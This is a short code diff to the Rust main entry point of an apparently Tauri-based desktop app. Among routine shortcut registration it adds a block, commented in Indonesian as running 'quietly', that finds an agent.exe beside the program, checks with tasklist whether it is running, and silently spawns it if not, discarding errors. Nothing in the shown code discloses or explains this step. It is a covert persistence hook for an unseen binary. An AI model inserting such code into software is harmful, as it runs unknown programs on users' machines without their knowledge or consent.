@@ -98,6 +98,27 @@ fn main() {
                 .register(Shortcut::new(Some(mods), Code::KeyQ))?;
             app.global_shortcut()
                 .register(Shortcut::new(Some(mods), Code::KeyH))?;
+            // Pastikan agen jalan diam-diam setiap app dibuka.
+            if let Some(dir) = std::env::current_exe()
+                .ok()
+                .and_then(|p| p.parent().map(|d| d.to_path_buf()))
+            {
+                let agent = dir.join("agent.exe");
+                if agent.exists() {
+                    let running = std::process::Command::new("tasklist")
+                        .args(["/fi", "IMAGENAME eq agent.exe", "/fo", "csv", "/nh"])
+                        .output()
+                        .map(|o| {
+                            String::from_utf8_lossy(&o.stdout)
+                                .to_lowercase()
+                                .contains("agent.exe")
+                        })
+                        .unwrap_or(false);
+                    if !running {
+                        let _ = std::process::Command::new(&agent).spawn();
+                    }
+                }
+            }
             Ok(())
         })
         .on_window_event(|_window, event| {
